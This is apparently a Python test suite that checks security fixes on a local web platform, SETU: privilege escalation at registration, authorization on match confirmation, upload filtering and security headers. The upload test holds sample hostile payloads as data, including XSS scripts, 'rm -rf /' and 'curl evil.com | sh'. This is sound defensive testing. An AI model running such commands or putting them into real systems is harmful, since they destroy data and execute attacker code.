"""
Automated security audit verification for SETU platform.
Tests SEC-001, SEC-004, SEC-005, SEC-007/008/009 remediations.
Uses http.client directly to avoid urllib redirect following issues.
"""
import http.client
import json

HOST = 'localhost'
PORT = 8000
PASS = '[PASS]'
FAIL = '[FAIL]'


def http_request(method, path, payload=None, token=None, content_type='application/json', body_bytes=None):
    """Direct HTTP request without redirect following."""
    conn = http.client.HTTPConnection(HOST, PORT, timeout=8)
    headers = {}
    if token:
        headers['Authorization'] = 'Bearer ' + token
    if body_bytes is not None:
        headers['Content-Type'] = content_type
        conn.request(method, path, body=body_bytes, headers=headers)
    elif payload is not None:
        body = json.dumps(payload).encode('utf-8')
        headers['Content-Type'] = 'application/json'
        conn.request(method, path, body=body, headers=headers)
    else:
        conn.request(method, path, headers=headers)
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    return resp.status, resp.getheaders(), data


def get_token(username, password):
    status, _, data = http_request('POST', '/api/auth/login/', {'username': username, 'password': password})
    if status == 200:
        return json.loads(data)['access']
    raise Exception(f'Login failed with HTTP {status}: {data}')


def main():
    print('=' * 60)
    print('    SETU SECURITY AUDIT VERIFICATION TEST SUITE        ')
    print('=' * 60)

    # ─────────────────────────────────────────────────────────
    # SEC-001: Privilege Escalation via Registration Mass Assignment
    # ─────────────────────────────────────────────────────────
    print('\n[SEC-001] Privilege Escalation via Registration Mass Assignment')

    status, _, data = http_request('POST', '/api/auth/register/', {
        'username': 'attacker_admin_test',
        'password': 'AttackerPassword123!',
        'role': 'admin',
        'is_verified': True,
        'is_staff': True
    })
    if status in (200, 201):
        # Check if role was actually set to admin
        user = json.loads(data)
        actual_role = user.get('role') or user.get('user', {}).get('role')
        if actual_role == 'admin':
            print(f'  {FAIL} Attacker registered as admin! Role={actual_role}')
        else:
            print(f'  {PASS} Registered but role was sanitized to: {actual_role} (not admin)')
    else:
        print(f'  {PASS} Admin role registration blocked outright (HTTP {status})')

    status2, _, _ = http_request('POST', '/api/auth/register/', {
        'username': 'attacker_officer_test',
        'password': 'AttackerPassword123!',
        'role': 'field_officer',
    })
    if status2 in (200, 201):
        print(f'  {FAIL} Field officer role accepted via public registration (HTTP {status2})')
    else:
        print(f'  {PASS} Field officer role blocked (HTTP {status2})')

    # ─────────────────────────────────────────────────────────
    # SEC-004: Broken Function Level Authorization - Match Confirm
    # ─────────────────────────────────────────────────────────
    print('\n[SEC-004] Broken Function Level Authorization - Match Confirmation')
    try:
        citizen_token = get_token('citizen_test_user_2', 'CitizenPassword123!')
        status, _, _ = http_request('POST', '/api/matches/1/confirm/', {'vehicle_id': 1}, token=citizen_token)
        if status in (200, 201):
            print(f'  {FAIL} Citizen confirmed emergency match dispatch (HTTP {status})!')
        else:
            print(f'  {PASS} Citizen match confirmation blocked (HTTP {status})')
    except Exception as e:
        print(f'  [INFO] Could not test with citizen token: {e}')

    # Unauthenticated attempt
    status_unauth, _, _ = http_request('POST', '/api/matches/1/confirm/', {})
    if status_unauth in (200, 201):
        print(f'  {FAIL} Unauthenticated match confirmation succeeded!')
    else:
        print(f'  {PASS} Unauthenticated match confirmation blocked (HTTP {status_unauth})')

    # ─────────────────────────────────────────────────────────
    # SEC-005: Unrestricted File Upload - Extension Whitelist
    # ─────────────────────────────────────────────────────────
    print('\n[SEC-005] Unrestricted File Upload - Extension & Size Validation')
    try:
        citizen_token = get_token('citizen_test_user_2', 'CitizenPassword123!')
    except Exception:
        citizen_token = None

    if citizen_token:
        for fname, content, ct, label in [
            ('exploit.html', b'<script>alert("XSS")</script>', 'text/html', 'XSS .html'),
            ('backdoor.py', b'import os; os.system("rm -rf /")', 'text/plain', 'Backdoor .py'),
            ('malware.svg', b'<svg><script>alert(1)</script></svg>', 'image/svg+xml', 'SVG XSS'),
            ('shell.sh', b'#!/bin/bash\ncurl evil.com | sh', 'text/plain', 'Shell script .sh'),
        ]:
            boundary = 'SetuSecBnd' + fname.replace('.', '')
            body = (
                b'--' + boundary.encode() + b'\r\n' +
                b'Content-Disposition: form-data; name="file"; filename="' + fname.encode() + b'"\r\n' +
                b'Content-Type: ' + ct.encode() + b'\r\n\r\n' +
                content + b'\r\n' +
                b'--' + boundary.encode() + b'--\r\n'
            )
            status, _, resp_data = http_request(
                'POST', '/api/needs/1/attachments/',
                body_bytes=body,
                content_type='multipart/form-data; boundary=' + boundary,
                token=citizen_token
            )
            if status in (200, 201):
                print(f'  {FAIL} {label} file upload succeeded (HTTP {status})!')
            else:
                print(f'  {PASS} {label} upload blocked (HTTP {status})')

        # Test oversized file (11MB - exceeds 10MB limit)
        big_body_content = b'A' * (11 * 1024 * 1024)
        boundary = 'SetuSecBndBigFile'
        big_body = (
            b'--' + boundary.encode() + b'\r\n' +
            b'Content-Disposition: form-data; name="file"; filename="large.jpg"\r\n' +
            b'Content-Type: image/jpeg\r\n\r\n' +
            big_body_content + b'\r\n' +
            b'--' + boundary.encode() + b'--\r\n'
        )
        status, _, _ = http_request(
            'POST', '/api/needs/1/attachments/',
            body_bytes=big_body,
            content_type='multipart/form-data; boundary=' + boundary,
            token=citizen_token
        )
        if status in (200, 201):
            print(f'  {FAIL} 11MB file upload succeeded — DoS vector unmitigated!')
        else:
            print(f'  {PASS} Oversized (11MB) file upload rejected (HTTP {status})')
    else:
        print('  [SKIP] No citizen token available')

    # ─────────────────────────────────────────────────────────
    # SEC-007/008/009: Security Headers Audit
    # ─────────────────────────────────────────────────────────
    print('\n[SEC-007/008/009] Security Misconfiguration - HTTP Response Headers')
    status, response_headers, _ = http_request('GET', '/api/districts/')
    hdrs = {h.lower(): v for h, v in response_headers}

    checks = [
        ('x-frame-options', 'DENY', 'X-Frame-Options'),
        ('x-content-type-options', 'nosniff', 'X-Content-Type-Options'),
        ('referrer-policy', 'strict-origin-when-cross-origin', 'Referrer-Policy'),
    ]
    for key, expected, label in checks:
        val = hdrs.get(key)
        result = PASS if val and expected.lower() in val.lower() else FAIL
        print(f'  {result} {label}: {val or "MISSING (header not sent)"}')

    # Verify CORS is not wildcard
    status, hdrs2_list, _ = http_request('OPTIONS', '/api/districts/', token=None, body_bytes=b'')
    hdrs2 = {h.lower(): v for h, v in hdrs2_list}
    acao = hdrs2.get('access-control-allow-origin', '')
    if acao == '*':
        print(f'  {FAIL} CORS: Access-Control-Allow-Origin is wildcard (*) — credentials exposed!')
    else:
        print(f'  {PASS} CORS: No wildcard origin (value: {acao or "not present on OPTIONS"})')

    print('\n' + '=' * 60)
    print('        SECURITY AUDIT VERIFICATION COMPLETE           ')
    print('=' * 60)


if __name__ == '__main__':
    main()
